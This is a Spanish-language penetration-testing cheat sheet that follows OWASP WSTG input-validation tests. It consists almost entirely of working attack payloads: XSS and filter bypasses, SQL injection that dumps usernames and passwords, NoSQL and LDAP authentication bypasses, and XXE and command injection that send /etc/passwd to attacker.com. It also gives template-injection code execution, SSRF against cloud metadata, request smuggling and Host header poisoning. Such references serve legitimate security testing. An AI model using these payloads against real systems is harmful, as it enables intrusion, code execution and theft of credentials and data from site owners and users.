# 4.7 Input Validation Testing (WSTG-INPV)

## WSTG-INPV-01/02: XSS (Reflected y Stored)

### Detectar Contexto de Reflexión
```
- En HTML body: <div>INPUT</div> → usar <script>alert(1)</script>
- En atributo: <input value="INPUT"> → usar " onmouseover="alert(1)
- En href: <a href="INPUT"> → usar javascript:alert(1)
- En script: var x = "INPUT" → usar "-alert(1)-"
- En evento: <img onerror="INPUT"> → usar alert(1)
- En CSS: style="color:INPUT" → usar red;}</style><script>alert(1)</script>
```

### Payloads por Contexto
```html
<!-- HTML context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Attribute context -->
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
" onclick="alert(1) x="

<!-- href/src context -->
javascript:alert(1)
javascript:void(alert(1))
data:text/html,<script>alert(1)</script>

<!-- JavaScript context -->
\"-alert(1)//
';alert(1)//
</script><script>alert(1)</script>
```

### Bypass de Filtros XSS
```html
<!-- Bypass de blacklists de "script" -->
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script >
<sc<script>ript>alert(1)</sc</script>ript>

<!-- Sin paréntesis -->
<img src=x onerror=alert`1`>

<!-- Encoding bypass -->
%3cscript%3ealert(1)%3c/script%3e
&#60;script&#62;alert(1)&#60;/script&#62;
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- DOM-based -->
location.hash = "#<img src=x onerror=alert(1)>"
document.write(location.hash.slice(1))

<!-- Bypass CSP con nonce (si predecible) -->
<script nonce="SAME_NONCE">alert(1)</script>

<!-- Polyglot XSS -->
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

### Stored XSS - Ubicaciones
- Perfiles de usuario (nombre, bio, avatar URL)
- Comentarios y posts
- Campos de búsqueda guardados
- Nombres de archivo en uploads
- Headers HTTP logueados (User-Agent, Referer)

---

## WSTG-INPV-04: HTTP Parameter Pollution (HPP)

```bash
# Duplicar parámetros para confundir filtros
/search?q=select&q=+from+users
/transfer?amount=100&to=victim&to=attacker  # ¿cuál procesa?

# Comportamiento por tecnología:
# PHP: último valor
# ASP.NET: concatenados con coma
# JSP/Tomcat: primer valor
```

---

## WSTG-INPV-05: SQL Injection

### Detección Inicial
```sql
-- Caracteres de prueba (uno por vez):
'  "  `  )  ))  '  ;  --  /*

-- Errores a buscar:
-- MySQL: "You have an error in your SQL syntax"
-- MSSQL: "Unclosed quotation mark"
-- Oracle: "ORA-01756"
-- PostgreSQL: "unterminated quoted string"

-- Payloads booleanos:
?id=1 AND 1=1    -- true (mismo resultado)
?id=1 AND 1=2    -- false (resultado diferente o vacío)
?id=1 OR 1=1     -- siempre true

-- Time-based blind:
?id=1' AND SLEEP(5)--            -- MySQL
?id=1'; WAITFOR DELAY '0:0:5'-- -- MSSQL
?id=1' AND 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -- MySQL alternativo
?id=1||(SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### Union-Based (in-band)
```sql
-- 1. Encontrar número de columnas:
?id=1 ORDER BY 1--   -- OK
?id=1 ORDER BY 10--  -- Error → menos de 10 columnas

-- 2. Encontrar columnas visibles:
?id=999 UNION SELECT null,null,null--
?id=999 UNION SELECT 1,2,3--  -- ¿qué número aparece en pantalla?

-- 3. Extraer datos:
-- MySQL
?id=999 UNION SELECT 1,database(),user()--
?id=999 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
?id=999 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
?id=999 UNION SELECT 1,concat(username,0x3a,password),3 FROM users--

-- MSSQL
?id=999 UNION SELECT 1,@@version,3--
?id=999 UNION SELECT 1,table_name,3 FROM information_schema.tables--

-- Oracle
?id=999 UNION SELECT null,banner,null FROM v$version--
?id=999 UNION SELECT null,table_name,null FROM all_tables--
```

### Blind Boolean
```sql
-- ¿Cuál es el primer carácter de la password del admin?
?id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
-- Si True → resultado normal; si False → resultado diferente/vacío

-- Herramienta: sqlmap para automatizar
sqlmap -u "https://target.com/item?id=1" --dbs --level=3 --risk=2
sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump
sqlmap -u "https://target.com/" --data="user=test&pass=test" -p user
```

### Error-Based
```sql
-- MySQL
?id=1' AND extractvalue(1,concat(0x7e,(SELECT database())))--
?id=1' AND updatexml(1,concat(0x7e,(SELECT database())),1)--

-- MSSQL
?id=1' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- Oracle
?id=1'||(SELECT UPPER(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual)||'
```

### WAF Bypass SQL
```sql
-- Espacios alternativos: %09 (tab), %0a (newline), /**/, ()
?id=1/**/UNION/**/SELECT/**/1,2,3--
?id=1%0aUNION%0aSELECT%0a1,2,3--
?id=1 UNiOn SeLeCt 1,2,3--

-- URL encode doble:
%27 → ' (simple)
%2527 → %27 → '  (doble)

-- Hex encoding:
?id=1 UNION SELECT 0x41,0x42,0x43--  -- 'A','B','C'

-- Comentarios:
?id=1 /*!UNION*/ /*!SELECT*/ 1,2,3--

-- Funciones alternativas MySQL:
MID() en vez de SUBSTRING()
IFNULL() en vez de IF()
```

### NoSQL Injection (WSTG-INPV-05.6)
```bash
# MongoDB injection
# En JSON body:
{"username": {"$gt": ""}, "password": {"$gt": ""}}  # bypass auth
{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrongpass"}}

# En URL params:
?username[$gt]=&password[$gt]=
?username[$regex]=.*&password[$regex]=.*

# Operator injection:
{"$where": "this.username == 'admin' && this.password.length > 0"}
```

---

## WSTG-INPV-06: LDAP Injection

```bash
# En campos de búsqueda/login que usan LDAP:
# Payload: *)(uid=*))(|(uid=*
# Resultado: (&(uid=*)(uid=*))(|(uid=*)(password=anything))

# Bypass de autenticación LDAP:
username: *
username: *)(&
username: *)(|

# Enumerar atributos:
*(cn=admin*)
*(mail=*)
```

---

## WSTG-INPV-07: XML Injection / XXE

```xml
<!-- XXE básico (leer archivo) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><user>&xxe;</user></root>

<!-- XXE con SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>

<!-- Blind XXE con out-of-band exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>

<!-- evil.dtd en attacker.com: -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

<!-- XXE en SVG upload -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg>&xxe;</svg>

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://internal-service/admin">
```

---

## WSTG-INPV-08: SSI Injection

```
<!-- En campos reflejados en páginas HTML: -->
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->
<!--#printenv-->
<!--#echo var="DATE_LOCAL"-->
```

---

## WSTG-INPV-12: Command Injection

### Payloads
```bash
# Separadores de comandos:
;id
|id
||id
&&id
`id`
$(id)
\nid    # newline

# Contextos:
# URL param: ?ip=127.0.0.1;id
# JSON body: {"ip":"127.0.0.1;id"}
# Header: User-Agent: curl/7.0;id

# Blind command injection (time-based):
;sleep 5
|sleep 5
$(sleep 5)
`sleep 5`

# Out-of-band:
;curl http://attacker.com/$(id)
;curl http://attacker.com/?data=$(cat /etc/passwd | base64)
;nslookup $(id).attacker.com

# Bypass de filtros:
# Espacios: ${IFS}, $IFS, {cmd,arg}, %09 (tab)
;c''at${IFS}/etc/pa''sswd
;$(printf "\x2fbin\x2fcat")/etc/passwd
```

---

## WSTG-INPV-13: Format String Injection

```bash
# PHP printf/sprintf vulnerabilities:
%s%s%s%s  # puede causar crash o leak de memoria
%x%x%x%x  # leak de stack (C)
%d%d%d%d

# Python format strings:
{__class__.__mro__}
{"".__class__.__mro__[1].__subclasses__()}
```

---

## WSTG-INPV-15: HTTP Splitting/Smuggling

```http
# Request Smuggling CL.TE:
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

XPOST /admin HTTP/1.1

# TE.CL:
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

---

## WSTG-INPV-17: Host Header Injection

```bash
# Cambiar Host header para varios ataques:
curl -H "Host: evil.com" https://target.com/forgot-password?email=victim@test.com
# → Email de reset contiene link a evil.com

# SSRF via Host:
curl -H "Host: internal-service:8080" https://target.com/

# Cache poisoning:
curl -H "Host: evil.com" https://target.com/
# Si el response se cachea con Host en href → usuarios futuros ven evil.com

# Headers adicionales a probar:
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

---

## WSTG-INPV-18: Server-Side Template Injection (SSTI)

### Detección por Motor de Templates
```
{{7*7}}          → 49 (Jinja2/Twig/Pebble)
${7*7}           → 49 (Freemarker/Velocity)
<%= 7*7 %>       → 49 (ERB/EJS)
#{7*7}           → 49 (Ruby)
*{7*7}           → 49 (Spring/Thymeleaf)
{{7*'7'}}        → 7777777 (Python Jinja2)
${{7*7}}         → 49 (Freemarker)
{7*7}            → 49 (Smarty)
```

### Explotación por Motor

**Jinja2 (Python)**
```python
# Info disclosure
{{config}}
{{config.items()}}

# RCE
{{''.__class__.__mro__[1].__subclasses__()[<index>]('id',shell=True,stdout=-1).communicate()}}
# Buscar índice de subprocess.Popen o os._wrap_close

# Simplificado con cycler, joiner, namespace:
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

**Twig (PHP)**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

**Freemarker (Java)**
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}
```

**ERB (Ruby)**
```ruby
<%= system("id") %>
<%= `id` %>
```

---

## WSTG-INPV-19: Server-Side Request Forgery (SSRF)

### Detección
```bash
# Parámetros vulnerables: url, link, src, href, redirect, fetch, callback, next, path, file, img
# Si la app hace requests a URLs externas basadas en input:

# Prueba básica:
curl "https://target.com/fetch?url=http://attacker.com/ssrf-test"
# → Verificar si el servidor hace request a attacker.com en logs

# Usar Burp Collaborator o webhook.site como receptor
```

### Payloads SSRF
```bash
# Cloud metadata
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/computeMetadata/v1/  # GCP (+ header Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance  # Azure
http://100.100.100.200/latest/meta-data/  # Alibaba

# localhost bypass
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://0177.0.0.1/   # octal
http://0x7f000001/   # hex
http://2130706433/   # decimal

# Bypass de filtros de IP:
http://127.1/
http://127.0.0.1.nip.io/
http://①②⑦.⓪.⓪.①/  # unicode

# Protocolos alternativos:
file:///etc/passwd
dict://localhost:6379/info   # Redis
gopher://localhost:6379/_PING  # Redis via gopher
ftp://attacker.com/
sftp://attacker.com/

# Redirección para bypass de whitelist:
# Si solo permite target.com:
# https://target.com/redirect?url=http://169.254.169.254/
```

### SSRF Blind
```bash
# Usar Burp Collaborator, interact.sh, webhook.site
# Verificar con DNS lookup primero (menos bloqueado que HTTP)
http://attacker-collaborator.com/  # si DNS resuelve → SSRF confirmado

# Exfiltrar datos vía DNS:
# En servidor vulnerable: fetch(f"http://{data}.attacker.com/")
# Capturar en: nc -lnvp 53 o dnslog.cn
```
